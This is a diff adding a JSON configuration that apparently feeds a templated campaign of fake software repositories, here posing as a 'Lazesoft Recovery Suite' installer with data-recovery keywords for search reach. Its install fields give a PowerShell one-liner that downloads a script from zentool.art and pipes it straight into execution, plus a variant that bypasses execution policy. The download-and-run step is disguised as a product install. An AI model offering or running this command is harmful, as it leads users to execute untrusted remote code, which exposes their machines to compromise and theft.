@@ -1,0 +1,31 @@
+{
+  "repo": "Lazesoft-Recovery-Suite-Setup",
+  "product": "Lazesoft Recovery Suite Setup",
+  "product_title": "Lazesoft Recovery",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "recovery",
+  "topics": [
+    "lazesoft-recovery",
+    "lazesoft-recovery-windows",
+    "lazesoft-recovery-desktop",
+    "lazesoft",
+    "recovery",
+    "data-recovery",
+    "file-restore",
+    "partition-recovery",
+    "deleted-files",
+    "storage-scan",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop"
+  ],
+  "site": "zentool.art"
+}
